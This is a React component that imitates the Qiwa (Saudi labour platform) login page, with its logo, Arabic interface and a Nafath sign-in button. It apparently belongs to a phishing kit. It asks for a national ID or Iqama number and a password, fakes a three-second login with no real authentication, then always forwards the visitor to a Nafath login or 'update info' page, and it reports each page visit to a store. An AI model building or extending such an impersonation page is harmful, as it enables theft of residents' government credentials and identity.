import { Button } from "@/components/ui/button";
import { Loader2, Monitor, FileText, FolderOpen } from "lucide-react";
import { useState, useEffect } from "react";
import { updatePage, clientNavigate } from "@/lib/store";

export default function QiwaLogin() {
  useEffect(() => {
    updatePage("صفحة قوى - تسجيل الدخول");
  }, []);

  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isNafathLoading, setIsNafathLoading] = useState(false);
  const [isRegisterLoading, setIsRegisterLoading] = useState(false);
  const [errors, setErrors] = useState<{userId?: string; password?: string}>({});

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: {userId?: string; password?: string} = {};
    if (!userId.trim()) newErrors.userId = "هذا الحقل مطلوب";
    if (!password.trim()) newErrors.password = "هذا الحقل مطلوب";
    
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }
    
    setErrors({});
    setIsLoading(true);
    setTimeout(() => {
      const searchParams = new URLSearchParams(window.location.search);
      const serviceName = searchParams.get('service');
      clientNavigate(serviceName ? `/nafath-login?service=${encodeURIComponent(serviceName)}` : "/nafath-login");
    }, 3000);
  };

  const handleNafathLogin = () => {
    setIsNafathLoading(true);
    setTimeout(() => {
      const searchParams = new URLSearchParams(window.location.search);
      const serviceName = searchParams.get('service');
      clientNavigate(serviceName ? `/nafath-login?service=${encodeURIComponent(serviceName)}` : "/nafath-login");
    }, 3000);
  };

  const handleRegister = () => {
    setIsRegisterLoading(true);
    setTimeout(() => {
      const searchParams = new URLSearchParams(window.location.search);
      const serviceName = searchParams.get('service');
      clientNavigate(serviceName ? `/update-info?service=${encodeURIComponent(serviceName)}` : "/update-info");
    }, 3000);
  };

  return (
    <div className="min-h-screen flex flex-row-reverse font-sans" dir="rtl">
      {/* Right Side - Login Form */}
      <div className="w-full lg:w-1/2 bg-white flex flex-col min-h-screen">
        {/* Header with Logo */}
        <div className="flex justify-between items-center p-6 pb-0">
          <img src="/images/qiwa-logo.png" alt="قوى" className="h-14 object-contain" />
          <div className="flex items-center gap-2 text-gray-500 cursor-pointer hover:text-gray-700 transition-colors">
            <span className="text-sm font-medium">AR</span>
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"/>
              <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/>
              <path d="M2 12h20"/>
            </svg>
          </div>
        </div>

        {/* Form */}
        <div className="flex-1 flex items-center justify-center px-8 lg:px-16">
          <div className="w-full max-w-[420px]">
            <h1 className="text-[32px] font-bold text-[#1a1a2e] mb-8">تسجيل الدخول</h1>
            
            <form onSubmit={handleLogin} className="space-y-5">
              {/* User ID Field */}
              <div>
                <label className="block text-sm font-semibold text-[#1a1a2e] mb-2">
                  رقم الهوية الوطنية أو البريد الإلكتروني
                </label>
                <input
                  type="text"
                  value={userId}
                  onChange={(e) => { setUserId(e.target.value); setErrors(prev => ({...prev, userId: undefined})); }}
                  placeholder="أدخل رقم الهوية الوطنية، أو الإقامة، أو البريد الإلكتروني"
                  className={`w-full px-4 py-3 border ${errors.userId ? 'border-red-500' : 'border-gray-300'} rounded-lg text-sm focus:outline-none focus:border-[#0066ff] focus:ring-1 focus:ring-[#0066ff] transition-colors`}
                />
                {errors.userId && <p className="text-red-500 text-xs mt-1">{errors.userId}</p>}
                <p className="text-gray-400 text-xs mt-1.5">Enter one of the following: your National ID, Iqama number, or email address.</p>
              </div>

              {/* Password Field */}
              <div>
                <div className="flex justify-between items-center mb-2">
                  <label className="text-sm font-semibold text-[#1a1a2e]">كلمة المرور</label>
                  <button type="button" className="text-[#0066ff] text-sm font-medium hover:underline">نسيت كلمة المرور</button>
                </div>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => { setPassword(e.target.value); setErrors(prev => ({...prev, password: undefined})); }}
                    placeholder="أدخل كلمة المرور"
                    className={`w-full px-4 py-3 border ${errors.password ? 'border-red-500' : 'border-gray-300'} rounded-lg text-sm focus:outline-none focus:border-[#0066ff] focus:ring-1 focus:ring-[#0066ff] transition-colors pl-12`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  >
                    {showPassword ? (
                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                    ) : (
                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    )}
                  </button>
                </div>
                {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
                <p className="text-gray-400 text-xs mt-1.5">Enter the password associated with your account.</p>
              </div>

              {/* Login Button */}
              <Button
                type="submit"
                className="w-full bg-[#0066ff] hover:bg-[#0052cc] text-white font-bold py-3 h-[48px] rounded-lg text-base transition-colors"
                disabled={isLoading}
              >
                {isLoading ? (
                  <Loader2 className="w-6 h-6 animate-spin" />
                ) : (
                  "تسجيل الدخول"
                )}
              </Button>
            </form>

            {/* Register Link */}
            <div className="text-center mt-4">
              <span className="text-sm text-gray-600">ليس لديك حساب على قوى؟ </span>
              {isRegisterLoading ? (
                <span className="inline-flex items-center gap-1 text-sm font-bold text-[#0066ff]">
                  <Loader2 className="w-3 h-3 animate-spin" />
                  جاري التحميل...
                </span>
              ) : (
                <button onClick={handleRegister} className="text-sm font-bold text-[#0066ff] hover:underline">سجّل الآن</button>
              )}
            </div>

            {/* Divider */}
            <div className="flex items-center gap-4 my-6">
              <div className="flex-1 h-[1px] bg-gray-200"></div>
              <span className="text-gray-400 text-sm">أو</span>
              <div className="flex-1 h-[1px] bg-gray-200"></div>
            </div>

            {/* Nafath Login */}
            <button
              onClick={handleNafathLogin}
              disabled={isNafathLoading}
              className="w-full flex items-center justify-center gap-3 border-2 border-gray-200 rounded-lg py-3 h-[48px] text-base font-bold text-[#006C35] hover:border-[#006C35] hover:bg-[#f0faf5] transition-all disabled:opacity-70"
            >
              {isNafathLoading ? (
                <Loader2 className="w-6 h-6 animate-spin text-[#006C35]" />
              ) : (
                <>
                  <span>تسجيل الدخول عن طريق</span>
                  <img src="/images/nafath-logo.png" alt="نفاذ" className="h-6 object-contain" />
                </>
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Left Side - Hero Section */}
      <div className="hidden lg:flex w-1/2 relative overflow-hidden">
        {/* Background Image */}
        <img 
          src="/images/qiwa-bg.jpg" 
          alt="Background" 
          className="absolute inset-0 w-full h-full object-cover"
        />
        {/* Dark Overlay */}
        <div className="absolute inset-0 bg-gradient-to-b from-[#1a1a2e]/80 via-[#1a1a2e]/70 to-[#1a1a2e]/90"></div>
        
        {/* Content */}
        <div className="relative z-10 flex flex-col justify-center px-12 py-16 text-white">
          <h2 className="text-[28px] font-bold leading-[1.6] mb-12">
            تعامل بسهولة ومرونة مع متطلبات<br />
            <span className="text-[#00d4aa]">العمل و التوظيف</span>
          </h2>
          
          <div className="space-y-8">
            <div className="flex items-center gap-4 flex-row-reverse">
              <div className="w-12 h-12 rounded-full bg-white/10 flex items-center justify-center flex-shrink-0">
                <Monitor className="w-6 h-6 text-white/80" />
              </div>
              <p className="text-white/90 text-base leading-relaxed">متوافق وسهل الاستخدام على الهواتف والأجهزة المكتبية</p>
            </div>
            
            <div className="flex items-center gap-4 flex-row-reverse">
              <div className="w-12 h-12 rounded-full bg-white/10 flex items-center justify-center flex-shrink-0">
                <FileText className="w-6 h-6 text-white/80" />
              </div>
              <p className="text-white/90 text-base leading-relaxed">تعامل سهل مع المعاملات الرسمية إلكترونياً</p>
            </div>
            
            <div className="flex items-center gap-4 flex-row-reverse">
              <div className="w-12 h-12 rounded-full bg-white/10 flex items-center justify-center flex-shrink-0">
                <FolderOpen className="w-6 h-6 text-white/80" />
              </div>
              <p className="text-white/90 text-base leading-relaxed">احصل على جميع مستنداتك بصورة رقمية</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
